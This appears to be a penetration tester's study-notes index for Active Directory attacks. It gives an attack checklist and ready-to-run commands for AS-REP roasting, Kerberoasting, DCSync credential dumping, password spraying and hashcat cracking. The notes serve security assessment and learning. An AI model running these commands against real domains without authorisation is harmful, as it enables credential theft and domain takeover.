# 🏰 Active Directory Index
#active-directory #phase

## Sub-Pages
- [[05-Active-Directory/AD Enumeration]]
- [[05-Active-Directory/Kerberos Attacks]]
- [[05-Active-Directory/BloodHound]]
- [[05-Active-Directory/AD Attack Chain]]

---

## AD Checklist

### Unauthenticated
- [ ] Kerbrute user enumeration
- [ ] AS-REP Roasting (no pre-auth required users)
- [ ] SMB null/guest session
- [ ] LDAP anonymous bind
- [ ] Password spray (be careful of lockouts!)

### Authenticated (low priv)
- [ ] BloodHound collection
- [ ] LDAP full enumeration
- [ ] Kerberoasting
- [ ] Share enumeration + sensitive file hunting
- [ ] ACL/DACL abuse enumeration (BloodHound)
- [ ] GPO enumeration
- [ ] Password in descriptions/attributes

### Elevated / DA Path
- [ ] DCSync (if replication rights)
- [ ] Pass-the-Hash / Pass-the-Ticket
- [ ] Golden / Silver Ticket
- [ ] Domain Persistence

---

## Quick Reference

### AS-REP Roasting (No creds needed)
```bash
impacket-GetNPUsers <domain>/ -dc-ip <DC_IP> -no-pass -usersfile users.txt -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt
```

### Kerberoasting
```bash
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt
```

### DCSync
```bash
impacket-secretsdump <domain>/<user>:<pass>@<DC_IP>
# Mimikatz: lsadump::dcsync /domain:<domain> /user:krbtgt
```

### Password Spray
```bash
crackmapexec smb <DC_IP> -u users.txt -p 'Password1' --continue-on-success
kerbrute passwordspray -d <domain> --dc <DC_IP> users.txt 'Password1'
```

---
*See also: [[04-Lateral-Movement/Lateral Movement Index]] | [[05-Active-Directory/BloodHound]] | [[05-Active-Directory/Kerberos Attacks]]*
